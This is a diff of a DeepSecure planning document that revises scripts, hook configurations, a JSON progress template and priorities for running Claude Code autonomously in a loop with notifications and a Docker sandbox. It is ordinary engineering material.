       osascript -e 'display notification "All tasks complete!" with title "Ralph Finished" sound name "Glass"' 2>/dev/null || true
     break
   fi
 
-  # Count remaining tasks
-  REMAINING=$(grep -c "^- \[ \]" "$PROGRESS_FILE" 2>/dev/null || echo 0)
   echo "Tasks remaining: $REMAINING"
 
+  # --- Dirty-tree idempotency guard (GAP #41 fix) ---
+  DIRTY=$(git status --short 2>/dev/null | head -5)
+  if [ -n "$DIRTY" ]; then
+    echo "WARNING: Dirty tree detected (likely crashed iteration). Auto-stashing..."
+    git stash push -m "ralph: auto-stash iteration $i $(date +%Y%m%d_%H%M%S)" 2>/dev/null || true
+  fi
+
   # Run Claude with fresh context
-  if claude --print \
+  # CRITICAL: < /dev/null prevents stdin hang in background execution (GAP #39 fix)
+  if OUTPUT=$(claude --print \
     --output-format json \
     --prompt-file "$PROMPT_FILE" \
-    --allowedTools "Edit,Write,Read,Bash(git:*),Bash(pytest:*),Bash(make:*),Bash(ruff:*),Bash(python:*),Bash(mypy:*),Bash(black:*),Bash(isort:*),Bash(find:*),Bash(grep:*),Bash(ls:*),Bash(cat:*)" \
+    --allowedTools "Edit,Write,Read,Bash(git:*),Bash(pytest:*),Bash(make:*),Bash(ruff:*),Bash(python:*),Bash(python3:*),Bash(mypy:*),Bash(black:*),Bash(isort:*),Bash(find:*),Bash(grep:*),Bash(ls:*),Bash(cat:*),Bash(docker:*),Bash(docker compose:*)" \
     --max-turns 80 \
-    --append-system-prompt "Read $PROGRESS_FILE. Find the FIRST unchecked task (line starting with '- [ ]'). Implement it fully. Run tests to verify. If tests pass, git add and commit with a descriptive message. Then update $PROGRESS_FILE: change '- [ ]' to '- [x]' for the completed task. If tests fail after 3 attempts, add '(BLOCKED: <reason>)' to the task line and move to the next task." \
-    2>&1 | tee "$LOG_FILE"; then
+    --max-budget-usd "$MAX_BUDGET" \
+    --append-system-prompt "Read $PROGRESS_FILE (JSON format). Find the FIRST task where passes=false and blocked=null. Implement it fully. Run tests to verify. If tests pass, git add and commit with a descriptive message. Then update $PROGRESS_FILE: set passes=true for the completed task. If tests fail after 3 attempts, set blocked='<reason>' for that task. When ALL tasks have passes=true, output the sentinel: <promise>COMPLETE</promise>" \
+    < /dev/null 2>&1 | tee "$LOG_FILE"); then
     FAILURES=0
+
+    # Sentinel completion detection (GAP #45 fix) — exit immediately if agent signals done
+    if echo "$OUTPUT" | grep -q "<promise>COMPLETE</promise>"; then
+      echo "Agent signaled COMPLETE. All tasks done!"
+      scripts/notify.sh "Ralph [$WORKSTREAM]" "ALL TASKS COMPLETE! Agent signaled done." "urgent" 2>/dev/null || \
+        osascript -e 'display notification "All tasks complete!" with title "Ralph Finished" sound name "Glass"' 2>/dev/null || true
+      break
+    fi
   else
     FAILURES=$((FAILURES + 1))
     echo "$(date): Iteration $i failed (consecutive failures: $FAILURES)" >> "$LEARNINGS_FILE"
@@ -1065,15 +1330,23 @@ done
 echo ""
 echo "=== Ralph Loop Complete ==="
 echo "Finished: $(date)"
-echo "Check progress: cat $PROGRESS_FILE"
+echo "Check progress: python3 -c \"import json; d=json.load(open('$PROGRESS_FILE')); done=sum(1 for t in d['tasks'] if t['passes']); blocked=sum(1 for t in d['tasks'] if t.get('blocked')); print(f'Done: {done}, Remaining: {len(d[\\\"tasks\\\"])-done-blocked}, Blocked: {blocked}')\""
 echo "Check learnings: cat $LEARNINGS_FILE"
 
 # Final notification
-COMPLETED=$(grep -c "^- \[x\]" "$PROGRESS_FILE" 2>/dev/null || echo 0)
-REMAINING=$(grep -c "^- \[ \]" "$PROGRESS_FILE" 2>/dev/null || echo 0)
-BLOCKED=$(grep -c "BLOCKED" "$PROGRESS_FILE" 2>/dev/null || echo 0)
-scripts/notify.sh "Ralph Finished ($WORKSTREAM)" "Done: $COMPLETED, Remaining: $REMAINING, Blocked: $BLOCKED" "urgent" 2>/dev/null || \
-  osascript -e "display notification \"Done: $COMPLETED, Left: $REMAINING, Blocked: $BLOCKED\" with title \"Ralph Finished\" sound name \"Glass\"" 2>/dev/null || true
+STATS=$(python3 -c "
+import json
+d = json.load(open('$PROGRESS_FILE'))
+done = sum(1 for t in d['tasks'] if t['passes'])
+blocked = sum(1 for t in d['tasks'] if t.get('blocked'))
+remaining = len(d['tasks']) - done - blocked
+print(f'Done: {done}, Remaining: {remaining}, Blocked: {blocked}')
+" 2>/dev/null || echo "unknown")
+scripts/notify.sh "Ralph Finished ($WORKSTREAM)" "$STATS" "urgent" 2>/dev/null || \
+  osascript -e "display notification \"$STATS\" with title \"Ralph Finished\" sound name \"Glass\"" 2>/dev/null || true
+
+# Cleanup caffeinate
+[ -n "${CAFFEINATE_PID:-}" ] && kill "$CAFFEINATE_PID" 2>/dev/null || true
 ```
 
 #### Step 2c: Learnings File
@@ -1099,6 +1372,62 @@ fix in CLAUDE.md, skills, or hooks so the failure class never recurs.
 (Populated by developers observing AFK loop failures)
 ```
 
+#### Step 2d: JSON Progress File Template (Replaces Markdown Checklist)
+
+**Why JSON instead of Markdown (Principle 12):** Anthropic's harness engineering research found that models are less likely to inappropriately modify structured JSON compared to Markdown. Markdown checklists get rewritten, re-summarized, or malformed during updates. JSON parse errors are immediately detectable. Carson's `prd.json` with boolean `passes` fields is the proven pattern.
+
+Create `docs/workstreams/<name>/ralph_progress.json`:
+
+```json
+{
+  "workstream": "<workstream-name>",
+  "created": "2026-05-29",
+  "tasks": [
+    {
+      "id": "WS-A1",
+      "description": "Create auth endpoint",
+      "ticket": "docs/workstreams/<name>/tasks/WS-A1.md",
+      "passes": false,
+      "blocked": null
+    },
+    {
+      "id": "WS-A2",
+      "description": "Add JWT validation",
+      "ticket": "docs/workstreams/<name>/tasks/WS-A2.md",
+      "passes": false,
+      "blocked": null
+    },
+    {
+      "id": "WS-B1",
+      "description": "Gateway routing",
+      "ticket": "docs/workstreams/<name>/tasks/WS-B1.md",
+      "passes": false,
+      "blocked": null
+    }
+  ],
+  "sentinel": "<promise>COMPLETE</promise>"
+}
+```
+
+**Field semantics:**
+- `passes: false` → not yet implemented
+- `passes: true` → implemented and tests pass
+- `blocked: null` → not blocked
+- `blocked: "reason string"` → failed after 3 attempts, moved to blocked
+- `sentinel` → the agent outputs this string when all tasks have `passes: true`
+
+**Script helpers:**
+```bash
+# Count remaining tasks
+python3 -c "import json; d=json.load(open('ralph_progress.json')); print(sum(1 for t in d['tasks'] if not t['passes'] and not t.get('blocked')))"
+
+# List blocked tasks
+python3 -c "import json; d=json.load(open('ralph_progress.json')); [print(f'{t[\"id\"]}: {t[\"blocked\"]}') for t in d['tasks'] if t.get('blocked')]"
+
+# Check if all done
+python3 -c "import json; d=json.load(open('ralph_progress.json')); print('COMPLETE' if all(t['passes'] for t in d['tasks']) else 'IN PROGRESS')"
+```
+
 #### Ralph Prompt Template
 
 Create `docs/workstreams/<name>/ralph-prompt.md` for each workstream:
@@ -1111,12 +1440,12 @@ You are implementing tasks for the DeepSecure <workstream> workstream.
 ## Context
 - Project: DeepSecure -- Identity-as-Code for AI agents
 - Read CLAUDE.md for project conventions
-- Read docs/workstreams/<name>/RALPH_PROGRESS.md for the task list
+- Read docs/workstreams/<name>/ralph_progress.json for the task list (JSON format)
 
 ## Your Mission
-1. Read RALPH_PROGRESS.md
-2. Find the FIRST unchecked task (line starting with `- [ ]`)
-3. Read the linked task ticket if one exists
+1. Read ralph_progress.json
+2. Find the FIRST task where `passes` is `false` and `blocked` is `null`
+3. Read the linked task ticket if one exists (the `ticket` field)
 4. Implement the task fully using TDD:
    a. Write a failing test first (red)
    b. Implement the minimum code to pass (green)
@@ -1124,8 +1453,9 @@ You are implementing tasks for the DeepSecure <workstream> workstream.
 5. Run `pytest` on affected tests
 6. Run `ruff check` on modified files
 7. If all checks pass: `git add` changed files and `git commit`
-8. Update RALPH_PROGRESS.md: change `- [ ]` to `- [x]`
-9. If tests fail after 3 fix attempts: add `(BLOCKED: <reason>)` to the task line
+8. Update ralph_progress.json: set `passes` to `true` for the completed task
+9. If tests fail after 3 fix attempts: set `blocked` to a reason string for that task
+10. If ALL tasks have `passes: true`, output: `<promise>COMPLETE</promise>`
 
 ## Anti-Rationalization Table
 | You Might Think | Why It's Wrong | Do This Instead |
@@ -1146,25 +1476,9 @@ You are implementing tasks for the DeepSecure <workstream> workstream.
 
 #### Ralph Progress File Template
 
-Create `docs/workstreams/<name>/RALPH_PROGRESS.md`:
+**DEPRECATED: Markdown checklists.** Use `ralph_progress.json` (see Step 2d above) instead. See Principle 12 for why JSON is preferred over Markdown for agent state tracking.
 
-```markdown
-# Ralph Progress: <Workstream Name>
-
-## Tasks
-- [ ] Task 1: <description> (see WS-A1 ticket) | passes: false
-- [ ] Task 2: <description> (see WS-A2 ticket) | passes: false
-- [ ] Task 3: <description> (see WS-B1 ticket) | passes: false
-- [ ] Task 4: <description> (see WS-B2 ticket) | passes: false
-
-## Blocked Tasks
-(Tasks that failed after 3 attempts are moved here with their error notes)
-
-## Completed
-(Summary of what was accomplished, updated by the agent)
-```
-
-**Effort:** 3 hours | **Impact:** Very High -- core AFK execution engine with manual stepping stone
+**Effort:** 4 hours | **Impact:** Very High -- core AFK execution engine with manual stepping stone, dirty-tree guard, JSON progress, sentinel detection, cost ceiling, and sleep prevention
 
 ---
 
@@ -1199,23 +1513,73 @@ fi
 export DEEPSECURE_SLACK_WEBHOOK="https://hooks.slack.com/services/YOUR/WEBHOOK/URL"
 ```
 
-#### 3c. PermissionRequest Hook (Route to Slack for AFK Approval)
+#### 3c. Permission Prompt Notification Hook
+
+**IMPORTANT (May 2026 API correction):** Claude Code does NOT have a `PermissionRequest` hook event. Use the `Notification` hook with `permission_prompt` matcher instead:
 
 ```json
 {
   "hooks": {
-    "PermissionRequest": [
+    "Notification": [
       {
-        "command": "scripts/notify.sh 'Permission Request' 'Claude needs: $TOOL_NAME -- $DESCRIPTION' urgent"
+        "matcher": "permission_prompt",
+        "hooks": [{
+          "type": "command",
+          "command": "scripts/notify.sh 'Permission Blocked' 'Claude Code is waiting for permission approval' urgent"
+        }]
       }
     ]
   }
 }
 ```
 
+This fires whenever the agent hits a command not covered by the allowlist and is waiting for human approval. During AFK, this is your signal to check in — either approve the action via Remote Control (Noah Zweben's pattern) or expand the allowlist for next time.
+
 #### 3d. Integration with Ralph Loop
 
 Already integrated into the `ralph.sh` script in Phase 2 -- sends notifications on iteration completion, all-tasks-done, and consecutive failures.
+
+#### 3e. Cross-Platform Notification Support
+
+The current `notify.sh` is macOS-only (`osascript`) with Slack webhook as the only cross-platform option. For broader support:
+
+```bash
+#!/bin/bash
+# scripts/notify.sh - Unified notification sender (cross-platform)
+TITLE=${1:-"DeepSecure"}
+MESSAGE=${2:-"Agent needs attention"}
+URGENCY=${3:-"normal"}  # normal, urgent
+
+# macOS notification
+if command -v osascript &>/dev/null; then
+  osascript -e "display notification \"$MESSAGE\" with title \"$TITLE\" sound name \"Glass\"" 2>/dev/null || true
+fi
+
+# Linux notification (libnotify)
+if command -v notify-send &>/dev/null; then
+  URGENCY_FLAG="normal"
+  [ "$URGENCY" = "urgent" ] && URGENCY_FLAG="critical"
+  notify-send -u "$URGENCY_FLAG" "$TITLE" "$MESSAGE" 2>/dev/null || true
+fi
+
+# Slack webhook (if configured)
+if [ -n "${DEEPSECURE_SLACK_WEBHOOK:-}" ]; then
+  EMOJI=":robot_face:"
+  [ "$URGENCY" = "urgent" ] && EMOJI=":rotating_light:"
+  curl -s -X POST "$DEEPSECURE_SLACK_WEBHOOK" \
+    -H 'Content-Type: application/json' \
+    -d "{\"text\": \"$EMOJI *$TITLE*: $MESSAGE\"}" > /dev/null 2>&1
+fi
+
+# Telegram (if configured)
+if [ -n "${DEEPSECURE_TELEGRAM_TOKEN:-}" ] && [ -n "${DEEPSECURE_TELEGRAM_CHAT_ID:-}" ]; then
+  curl -s -X POST "https://api.telegram.org/bot${DEEPSECURE_TELEGRAM_TOKEN}/sendMessage" \
+    -d "chat_id=${DEEPSECURE_TELEGRAM_CHAT_ID}" \
+    -d "text=$([ "$URGENCY" = "urgent" ] && echo "🚨" || echo "🤖") $TITLE: $MESSAGE" > /dev/null 2>&1
+fi
+```
+
+**Security note:** Store webhook URLs and tokens in shell profile (`~/.zshrc` or `~/.bashrc`), NOT in `.env` files that could be committed to git. For a security product, exposing notification credentials in the repo is especially bad optics.
 
 **Effort:** 2 hours | **Impact:** High -- enables true AFK (away from machine)
 
@@ -1275,58 +1639,106 @@ A distinct profile for AFK mode that allows development tools but explicitly den
 
 **Key difference from Phase 1a:** Phase 1a is a broad allowlist for interactive use. This AFK profile adds explicit denials for dangerous operations that an unsupervised agent should never do.
 
+**CRITICAL WARNING (May 2026 review):** The deny-list above is a defense-in-depth layer, NOT a primary security control. Pattern-based denials are trivially bypassed (see Pillar 5 warning). For true unsupervised AFK execution, use a Docker sandbox:
+
+#### Docker Sandbox for AFK Execution (Recommended)
+
+The industry-standard approach (Ramp, Cursor, OpenAI) for unsupervised agent execution is environment-level isolation, not command-level pattern matching:
+
+```bash
+#!/bin/bash
+# scripts/afk-sandbox.sh - Run AFK agent in a Docker sandbox
+# Secrets are never mounted. The agent literally cannot access them.
+
+WORKSTREAM=${1:?"Usage: afk-sandbox.sh <workstream-name>"}
+
+docker run --rm -it \
+  -v "$(pwd):/workspace" \
+  -v "$HOME/.claude:/root/.claude:ro" \
+  -w /workspace \
+  --network host \
+  -e RALPH_MAX_BUDGET=5.00 \
+  -e RALPH_MAX_ITERATIONS=10 \
+  python:3.11-slim \
+  bash -c "
+    pip install claude-code && \
+    cd /workspace && \
+    ./scripts/ralph.sh $WORKSTREAM
+  "
+
+# What's NOT mounted:
+# - ~/.ssh/ (no SSH keys)
+# - ~/.aws/ (no AWS credentials)
+# - ~/.config/gcloud/ (no GCP credentials)
+# - .env files with secrets (only workspace code)
+```
+
+The deny-list remains useful as a secondary control for non-sandboxed interactive development — it catches accidental access. But for overnight AFK, use the sandbox.
+
 #### Additional Hook Events
 
-Expand hooks beyond Phase 1 to cover AFK-critical events:
+**IMPORTANT (May 2026 API verification):** The hook event names below have been corrected to match the actual Claude Code API. Earlier versions of this document used incorrect event names (`PostCompact`, `PreCompact`, `PermissionRequest`, `SessionEnd`, `SubagentStop`). The corrected hook configuration:
 
 ```json
 {
-  "version": 1,
   "hooks": {
     "PostToolUse": [
       {
-        "matcher": { "tool_name": "Edit|Write" },
-        "command": "FILE_PATH=$(echo $TOOL_INPUT | jq -r '.file_path // empty'); if [ -n \"$FILE_PATH\" ] && echo \"$FILE_PATH\" | grep -q '\\.py$'; then ruff format --quiet \"$FILE_PATH\" 2>/dev/null; isort --quiet \"$FILE_PATH\" 2>/dev/null; fi"
-      }
-    ],
-    "PostCompact": [
-      {
-        "command": "cat .claude/compact-recovery.md 2>/dev/null || true"
-      }
-    ],
-    "PreCompact": [
-      {
-        "command": "echo 'CONTEXT COMPACTING: saving state snapshot'; git stash list 2>/dev/null | head -3"
-      }
-    ],
-    "Stop": [
-      {
-        "command": ".cursor/hooks/on-task-stop.sh"
-      }
-    ],
-    "PermissionRequest": [
-      {
-        "command": "scripts/notify.sh 'Permission Request' \"Claude needs: $TOOL_NAME\" urgent"
+        "matcher": "Edit|Write",
+        "hooks": [{
+          "type": "command",
+          "command": "FILE_PATH=$(echo $TOOL_INPUT | jq -r '.file_path // empty'); if [ -n \"$FILE_PATH\" ] && echo \"$FILE_PATH\" | grep -q '\\.py$'; then ruff format --quiet \"$FILE_PATH\" 2>/dev/null; isort --quiet \"$FILE_PATH\" 2>/dev/null; fi"
+        }]
       }
     ],
     "SessionStart": [
       {
-        "command": "echo '--- Recent commits ---'; git log --oneline -5 2>/dev/null; echo '--- Branch ---'; git branch --show-current 2>/dev/null; echo '--- Open PRs ---'; gh pr list --limit 3 2>/dev/null || true"
+        "matcher": "compact",
+        "hooks": [{
+          "type": "command",
+          "command": "cat .claude/compact-recovery.md 2>/dev/null || true"
+        }]
       }
     ],
-    "SessionEnd": [
+    "Stop": [
       {
-        "command": "scripts/notify.sh 'Session Ended' 'Claude Code session finished on branch: $(git branch --show-current 2>/dev/null)'"
+        "hooks": [{
+          "type": "command",
+          "command": ".claude/hooks/on-task-stop.sh"
+        }]
       }
     ],
-    "SubagentStop": [
+    "Notification": [
       {
-        "command": "echo 'Subagent completed: $SUBAGENT_NAME'"
+        "matcher": "permission_prompt",
+        "hooks": [{
+          "type": "command",
+          "command": "scripts/notify.sh 'Permission Blocked' 'Claude Code is waiting for permission approval' urgent"
+        }]
+      }
+    ],
+    "SessionStart": [
+      {
+        "matcher": "startup",
+        "hooks": [{
+          "type": "command",
+          "command": "echo '--- Recent commits ---'; git log --oneline -5 2>/dev/null; echo '--- Branch ---'; git branch --show-current 2>/dev/null; echo '--- Open PRs ---'; gh pr list --limit 3 2>/dev/null || true"
+        }]
       }
     ]
   }
 }
 ```
+
+**Corrected event names (May 2026):**
+
+| Old (Incorrect) | New (Correct) | Notes |
+|------------------|---------------|-------|
+| `PostCompact` | `SessionStart` with `matcher: "compact"` | Fires when context is compacted |
+| `PreCompact` | *(does not exist)* | No pre-compaction hook available |
+| `PermissionRequest` | `Notification` with `matcher: "permission_prompt"` | Fires when agent is blocked on permission |
+| `SessionEnd` | *(does not exist as a separate event)* | Use `Stop` hook instead |
+| `SubagentStop` | *(does not exist as a separate event)* | Agent harness handles this internally |
 
 **Effort:** 2 hours | **Impact:** High -- comprehensive AFK safety net and event tracking
 
@@ -1585,7 +1997,7 @@ tools:
 4. **MCP for external data** -- use MCP tools for databases, APIs, monitoring instead of dumping data into context
 
 ## Compaction Strategy
-- PostCompact hook re-injects critical rules from .claude/compact-recovery.md
+- SessionStart hook (compact matcher) re-injects critical rules from .claude/compact-recovery.md
 - If quality degrades after compaction, exit and restart with fresh context
 - For Ralph loops: each iteration is naturally a fresh context (no compaction needed)
 
@@ -1710,6 +2122,10 @@ Create `.claude/skills/identity-management/gotchas.md`:
 
 ### Phase 5: CLAUDE.md Refactoring (OpenAI Pattern)
 
+**PREREQUISITE (May 2026 review finding):** Phase 1d (SessionStart compact hook) MUST be implemented and tested BEFORE this phase. Without it, splitting CLAUDE.md is a regression — referenced files are NOT auto-loaded by Claude Code, so every fresh Ralph iteration starts without critical rules. The SessionStart hook that `cat`s `.claude/compact-recovery.md` is the mechanism that ensures critical rules survive the split.
+
+**Additionally**, the ralph-prompt.md template MUST explicitly instruct the agent to read referenced files at the start of each iteration. Without this, agents will only see the slim CLAUDE.md and miss backend conventions, token types, etc.
+
 Split the current ~800-line CLAUDE.md into a slim root file with pointers to detailed references, following OpenAI's progressive disclosure pattern.
 
 #### Target Structure
@@ -1804,9 +2220,20 @@ E2E tests for cross-service features.
 
 ---
 
-### Phase 6: Sandcastle-Style Parallel Orchestration
+### Phase 6: Parallel Orchestration
 
-For truly parallel AFK operation on multi-service features. This combines worktree isolation with automated agent spawning, following Matt Pocock's Sandcastle orchestration pattern.
+**UPDATED (May 2026):** Claude Code's Dynamic Workflows (launched May 28, 2026) may replace much of this phase's manual infrastructure. Evaluate Dynamic Workflows first before building custom tmux/worktree orchestration.
+
+**Two approaches available:**
+
+| Approach | When to Use | Complexity |
+|----------|-------------|-----------|
+| **Dynamic Workflows** (new) | Intra-batch parallelism (multiple independent tasks within one batch) | Low — built into Claude Code |
+| **Sandcastle-style scripts** (below) | Multi-service parallel development (control plane + gateway in separate worktrees) | High — custom scripts |
+
+**Recommendation:** Start with Dynamic Workflows for most parallel work. Only build the Sandcastle scripts if you need multi-worktree isolation for services that share no files.
+
+For truly parallel AFK operation on multi-service features, the Sandcastle approach combines worktree isolation with automated agent spawning, following Matt Pocock's Sandcastle orchestration pattern.
 
 #### Orchestration Pattern
 
@@ -1868,6 +2295,13 @@ for SVC in $SERVICES; do
   cp -r "$BASE_DIR/.claude" "$WORKTREE/" 2>/dev/null || true
   cp "$BASE_DIR/CLAUDE.md" "$WORKTREE/" 2>/dev/null || true
 
+  # CRITICAL (race condition fix): Each worktree gets its OWN progress file.
+  # Sharing ralph_progress.json across worktrees causes both agents to pick the same task.
+  # The per-service prompt file ($PROMPT) should reference a service-specific progress file.
+  if [ ! -f "$WORKTREE/docs/workstreams/$FEATURE/ralph_progress_${SVC}.json" ]; then
+    echo "WARNING: No service-specific progress file found. Agents may race on shared tasks."
+  fi
+
   # Verify prompt file exists
   if [ ! -f "$BASE_DIR/$PROMPT" ]; then
     echo "WARNING: $PROMPT not found. Skipping $SVC."
@@ -1900,10 +2334,21 @@ echo "Waiting for all agents to complete..."
 echo "(You can safely go AFK now)"
 echo ""
 
-# Wait for all agents
+# Wait for all agents and track failures
+FAILED_SVCS=()
+SVC_INDEX=0
 for PID in "${PIDS[@]}"; do
-  wait $PID 2>/dev/null || true
+  SVC_NAME=$(echo $SERVICES | tr ' ' '\n' | sed -n "$((SVC_INDEX+1))p")
+  if ! wait $PID 2>/dev/null; then
+    FAILED_SVCS+=("$SVC_NAME")
+    echo "FAILED: $SVC_NAME agent (PID $PID) exited with error"
+  fi
+  SVC_INDEX=$((SVC_INDEX+1))
 done
+
+if [ ${#FAILED_SVCS[@]} -gt 0 ]; then
+  "$BASE_DIR/scripts/notify.sh" "Parallel Build" "FAILURES: ${FAILED_SVCS[*]}" "urgent"
+fi
 
 echo ""
 echo "=== All agents complete ==="
@@ -2043,7 +2488,7 @@ Nous Research's [Hermes Agent](https://github.com/nousresearch/hermes-agent) (16
 |------------|----------------------|--------------|
 | **Scheduling** | `cron` + `ralph.sh` | Built-in cron with natural-language task definitions |
 | **Notifications** | `scripts/notify.sh` + Slack webhook | Native multi-platform: Slack, Telegram, Discord, WhatsApp, Signal, SMS, Email from one process |
-| **Memory** | File-based (`RALPH_PROGRESS.md`, `.afk/learnings.md`) | Agent-curated persistent memory with FTS5 search over session history, cross-session recall |
+| **Memory** | File-based (`ralph_progress.json`, `.afk/learnings.md`) | Agent-curated persistent memory with FTS5 search over session history, cross-session recall |
 | **Parallelism** | `&` backgrounding or tmux sessions | ThreadPoolExecutor (up to 8 parallel workers), subagent spawning |
 | **Isolation** | Git worktrees | 6 terminal backends: local, Docker, SSH, Singularity, Modal (serverless), Daytona |
 | **Skills** | Static markdown files | Auto-created, self-improving skills compatible with agentskills.io standard |
@@ -2093,46 +2538,297 @@ The critical distinction: Hermes should gain authority gradually, not all at onc
 
 ---
 
-## Priority Ranking
+## Priority Ranking (Revised May 2026)
 
 | Priority | Action | Effort | Impact | What It Enables |
 |----------|--------|--------|--------|-----------------|
+| **P0** | Verify Claude Code API surface | 2 hr | BLOCKER | Everything depends on this — test every assumed flag, hook, env var |
 | **P0** | Permission allowlisting (1a) | 30 min | High | Unblocks all AFK work |
 | **P0** | Stop hook enhancement (1b) | 30 min | High | Prevents premature agent stopping |
-| **P0** | SessionStart hook (1e) | 30 min | Medium | Agents start with situational awareness |
+| **P0** | Notification hook (1f) | 15 min | High | Know when agent is blocked on permission |
+| **P1** | `afk-once.sh` with dirty-tree guard (2a) | 2 hr | High | Learn failure domains before automating |
+| **P1** | `ralph.sh` with JSON progress + sentinel + caffeinate (2b) | 3 hr | Very High | Core AFK execution engine |
+| **P1** | JSON progress template (2d) | 30 min | High | Reliable state tracking (Principle 12) |
+| **P1** | SessionStart hook — compact matcher (1d) | 1 hr | High | Prevents context loss in long sessions |
+| **P1** | SessionStart hook — startup matcher (1e) | 30 min | Medium | Agents start with situational awareness |
 | **P1** | PostToolUse auto-format (1c) | 1 hr | Medium | Eliminates CI format failures |
 | **P1** | Notification system (Phase 3) | 2 hr | High | Know when to come back |
-| **P1** | `afk-once.sh` manual script (2a) | 1 hr | High | Learn failure domains before automating |
-| **P1** | Ralph loop script (2b) | 2 hr | Very High | Core AFK execution engine |
 | **P1** | `.afk/learnings.md` (2c) | 30 min | Medium | Systematic failure capture |
-| **P2** | Agent frontmatter upgrade (1.5) | 2 hr | Medium | Correct tool access and model selection |
-| **P2** | AFK security profile (3.5) | 2 hr | High | Safe unsupervised execution |
+| **P2** | AFK security profile + Docker sandbox (3.5) | 3 hr | High | Safe unsupervised execution |
+| **P2** | `/afk` toggle command | 2 hr | High | One-command AFK mode switching |
 | **P2** | `/babysit-pr` skill | 4 hr | High | Autonomous PR lifecycle |
 | **P2** | `/autofix-pr` skill | 4 hr | High | Autonomous CI fixing |
-| **P2** | PostCompact hook (1d) | 1 hr | Medium | Prevents context loss |
-| **P2** | Additional hook events (3.5) | 1 hr | Medium | Complete AFK event tracking |
-| **P3** | CLAUDE.md refactoring (Phase 5) | 4 hr | Medium | Token savings, progressive disclosure |
+| **P2** | `/security-scan` skill | 3 hr | High | Prevent vulnerable code in AFK commits |
+| **P2** | Agent frontmatter upgrade (1.5) | 2 hr | Medium | Correct tool access and model selection |
+| **P2** | Evaluate Dynamic Workflows for Phase 6 | 4 hr | High | May eliminate custom parallel scripts |
+| **P3** | CLAUDE.md refactoring (Phase 5) — **AFTER** 1d hook verified | 4 hr | Medium | Token savings, progressive disclosure |
 | **P3** | `/grill-me` skill | 2 hr | Medium | Better specs before implementation |
 | **P3** | `/verify-app` skill | 4 hr | Medium | End-to-end feature verification |
 | **P3** | `doc-gardener` agent | 4 hr | Medium | Skills staleness audit |
 | **P3** | `/context-engineering` skill | 2 hr | Medium | Context management guidance |
-| **P3** | Parallel orchestration (Phase 6) | 10 hr | Very High | Multi-service parallel AFK |
-| **P2** | `/afk` toggle command | 2 hr | High | One-command AFK mode switching |
-| **P2** | `/security-scan` skill | 3 hr | High | Prevent vulnerable code in AFK commits |
+| **P3** | Parallel orchestration scripts (Phase 6) — only if Dynamic Workflows insufficient | 10 hr | Very High | Multi-service parallel AFK |
 | **P3** | `/identity-management` skill | 4 hr | Medium | Zero-trust AFK agent identity |
 | **P3** | Skill `gotchas.md` files | 3 hr | Medium | Domain-specific pitfall prevention |
 | **P4** | Zero-trust AFK identity integration | 8 hr | High | Dog-food DeepSecure for AFK security |
 | **P4** | Fast-merge policy + automated rollback | 6 hr | Medium | Remove human bottleneck at scale |
-| **P4** | Hermes Agent evaluation | 6 hr | Medium | Evaluate as orchestration layer (scheduling, notifications, memory, multi-agent) |
+| **P4** | Hermes Agent evaluation | 6 hr | Medium | Evaluate as orchestration layer |
+| **P4** | One-minute build rule enforcement | 3 hr | Medium | Force smaller, faster feedback loops |
 
-**Total estimated effort:** ~74 hours across all phases
+**Total estimated effort:** ~86 hours across all phases (revised up from 74 — original estimates were systematically optimistic, per review finding)
 
 **Recommended order:**
-1. **P0 items first** (1.5 hours) -- immediately unblocks AFK
-2. **P1 items next** (6.5 hours) -- gives you a working AFK loop with manual stepping stone and notifications
-3. **P2 items** (19 hours) -- completes autonomous PR lifecycle with safe security profile, AFK toggle, vulnerability scanning
-4. **P3 items** (27 hours) -- optimization, scaling, identity management, and maintenance automation
-5. **P4 items** (20 hours) -- zero-trust dog-fooding, fast-merge policy, Hermes Agent evaluation
+1. **P0 items first** (3.25 hours) — verify API surface (BLOCKER), then unblock AFK
+2. **P1 items next** (11.5 hours) — gives you a working AFK loop with JSON progress, dirty-tree guard, sentinel detection, cost ceiling, sleep prevention, notifications, and context recovery
+3. **P2 items** (22 hours) — completes autonomous PR lifecycle with Docker sandbox, Dynamic Workflows eval, AFK toggle, vulnerability scanning
+4. **P3 items** (29 hours) — optimization, scaling, identity management, and maintenance automation
+5. **P4 items** (23 hours) — zero-trust dog-fooding, fast-merge policy, Hermes Agent evaluation, build speed enforcement
+
+---
+
+## Architectural Decision: Ralph Loop vs /run-batch
+
+**This is the single most important decision before implementation.** The current document describes two execution paths that overlap and will drift:
+
+### The Conflict
+
+| Execution Path | How It Works | What It Provides |
+|----------------|-------------|------------------|
+| **Ralph loop** (`ralph.sh`) | Fresh `claude --print` per task, reads JSON progress, implements one task, commits | Fresh context, dirty-tree recovery, sentinel detection, cost ceiling |
+| **`/run-batch --continue --auto-heal`** | Single conversation session chains batches, follows skill spec procedurally | Spec-implementation audit, merge point verification, container testing, cross-service integration |
+
+The Ralph loop bypasses `/run-batch` entirely — it runs tasks via `--append-system-prompt` instead of through the `/run-batch` pipeline. This means:
+- No spec-implementation audit (Step 6 of `/run-batch`)
+- No cross-service integration verification (Step 7.5)
+- No merge point execution via `execute_merge_point.sh` (Step 7e)
+- No container rebuild and test (Step 7h)
+
+### Three Options
+
+**Option A: Ralph wraps /run-batch (RECOMMENDED)**
+
+Each Ralph iteration invokes `/run-batch` for one batch. Gets all verification infrastructure. Heavier per iteration but maintains rigor.
+
+```bash
+# In ralph.sh, replace direct claude invocation with:
+claude --print \
+  --prompt-file "$PROMPT_FILE" \
+  --append-system-prompt "Run /run-batch $BATCH_ID $WORKSTREAM. Execute only this one batch. When done, exit." \
+  < /dev/null
+```
+
+**Pros:** Full verification pipeline, merge point handling, spec auditing
+**Cons:** Heavier per iteration (~15-20 min vs ~5-10 min), single-batch granularity
+
+**Option B: Ralph replaces /run-batch**
+
+Lightweight, fast, but loses merge point verification, spec auditing, container testing. Use only if `/run-batch` infrastructure proves too heavy for AFK iteration speed.
+
+**Pros:** Fast iterations, simple
+**Cons:** No verification beyond tests, status files may drift
+
+**Option C: /run-batch --continue --auto-heal IS the AFK engine (no Ralph)**
+
+Single session, chains batches. No Ralph needed. But context sediment accumulates, and machine sleep/crash loses all state.
+
+**Pros:** Existing infrastructure, no new scripts
+**Cons:** Sediment problem (Principle 3), no crash recovery, no cost ceiling per task
+
+### Recommendation
+
+**Start with Option B** (Ralph replaces /run-batch) for the first 5-10 `afk-once.sh` manual iterations. This lets you learn failure domains fast without the overhead of the full pipeline.
+
+**Graduate to Option A** (Ralph wraps /run-batch) once you've validated that:
+1. The Ralph loop is stable (3+ successful unattended runs)
+2. The JSON progress file is reliable
+3. Notification system catches failures promptly
+
